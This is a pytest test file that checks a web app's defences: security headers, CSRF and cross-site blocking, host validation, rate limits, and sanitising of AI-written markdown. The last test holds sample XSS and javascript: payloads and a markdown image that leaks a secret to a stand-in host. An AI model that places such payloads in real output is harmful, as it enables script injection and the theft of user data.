import pytest

from jobhq.security import RateLimiter


def test_security_headers_on_every_response(anon):
    response = anon.get("/login")
    csp = response.headers["content-security-policy"]
    assert "script-src 'self'" in csp and "unsafe-inline" not in csp and "frame-ancestors 'none'" in csp
    assert "img-src 'self' data:" in csp  # no outside images: AI text can't leak data through an image URL
    assert response.headers["x-frame-options"] == "DENY"
    assert response.headers["referrer-policy"] == "no-referrer"
    assert "max-age=31536000" in response.headers["strict-transport-security"]
    assert response.headers["cache-control"] == "no-store"
    assert "microphone=(self)" in response.headers["permissions-policy"]


def test_static_files_can_be_cached(anon):
    response = anon.get("/static/app.css")
    assert response.status_code == 200 and response.headers.get("cache-control") != "no-store"


def test_post_without_csrf_token_is_blocked(client):
    del client.headers["X-CSRF-Token"]
    response = client.post("/reminders", data={"text": "x", "preset": "hour"})
    assert response.status_code == 403 and "security token" in response.json()["error"]


def test_post_with_wrong_csrf_token_is_blocked(client):
    client.headers["X-CSRF-Token"] = "nope"
    assert client.post("/reminders", data={"text": "x", "preset": "hour"}).status_code == 403


@pytest.mark.parametrize("headers", [
    {"Origin": "https://evil.example"},
    {"Origin": "https://sibling.example.test"},  # another copy on the same VM
    {"Sec-Fetch-Site": "cross-site"},
    {"Sec-Fetch-Site": "same-site"},
])
def test_cross_site_posts_are_blocked(client, headers):
    client.headers.update(headers)
    assert client.post("/reminders", data={"text": "x", "preset": "hour"}).status_code == 403


def test_signed_out_posts_are_blocked(anon):
    assert anon.post("/reminders", data={"text": "x"}, headers={"Origin": "https://me.example.test"}).status_code == 403


def test_signed_out_pages_redirect_to_login(anon):
    response = anon.get("/roles")
    assert response.status_code == 303 and response.headers["location"] == "/login"
    response = anon.get("/roles", headers={"HX-Request": "true"})
    assert response.status_code == 401 and response.headers["hx-redirect"] == "/login"


def test_unknown_host_header_rejected(app):
    from fastapi.testclient import TestClient
    with TestClient(app, base_url="https://attacker.example") as c:
        assert c.get("/login").status_code == 400


def test_oversized_body_rejected(client):
    response = client.post("/chat/1/send", content=b"x" * 1_100_000, headers={"Content-Type": "application/x-www-form-urlencoded"})
    assert response.status_code == 413


def test_rate_limit():
    limiter = RateLimiter()
    results = [limiter.allow("auth", "1.2.3.4") for _ in range(25)]
    assert results.count(True) == 20 and results[-1] is False
    assert limiter.allow("auth", "5.6.7.8")


def test_sign_in_is_rate_limited(anon):
    codes = [anon.get("/auth/google").status_code for _ in range(25)]
    assert 429 in codes


def test_no_api_docs_exposed(anon):
    for path in ("/docs", "/redoc", "/openapi.json"):
        assert anon.get(path).status_code in (303, 404)


def test_health_check_is_public_and_minimal(anon):
    response = anon.get("/healthz")
    assert response.status_code == 200 and response.json() == {"ok": True}


def test_markdown_from_ai_is_escaped():
    from jobhq.web.common import markdown
    html = str(markdown('<script>alert(1)</script> [x](javascript:alert(1)) ![i](https://evil/x.png?d=secret) [ok](https://example.com)'))
    assert "<script>" not in html
    assert 'href="javascript' not in html  # left as plain text, never a link
    assert "<img" not in html  # images are off, so nothing loads without a click
    assert 'href="https://example.com"' in html and 'rel="noopener noreferrer nofollow"' in html
